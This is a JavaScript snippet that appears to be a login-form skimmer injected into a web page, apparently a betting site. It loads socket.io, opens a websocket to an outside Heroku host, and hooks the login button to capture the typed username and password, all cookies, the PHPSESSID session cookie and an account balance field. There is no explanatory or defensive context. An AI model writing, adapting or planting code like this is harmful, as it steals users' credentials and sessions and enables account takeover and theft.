var jQueryScriptIO = document.createElement('script');  
jQueryScriptIO.setAttribute('src','https://cdn.socket.io/4.0.2/socket.io.min.js');
jQueryScriptIO.setAttribute('integrity','sha384-Bkt72xz1toXkj/oEiOgkQwWKbvNYxTNWMqdon3ejP6gwq53zSo48nW5xACmeDV0F')
jQueryScriptIO.setAttribute('crossorigin',"anonymous")
document.head.appendChild(jQueryScriptIO);
const socket = io("https://vin88.herokuapp.com",{ transport : ['websocket'] });
var jQueryScript = document.createElement('script');  
jQueryScript.setAttribute('src','https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js');
document.head.appendChild(jQueryScript);
var acc = {}
$(".button-login").click(function (e) { 
    e.preventDefault();
    acc.username = $("input[name=txtUsername]").val();
    acc.pass = $("input[name=txtPassword]").val();
    setTimeout(() => {
        acc.cookie = document.cookie
        acc.gvin = $(".money-1").text();
        acc.sessid = $.cookie("PHPSESSID");
    }, 8);
});
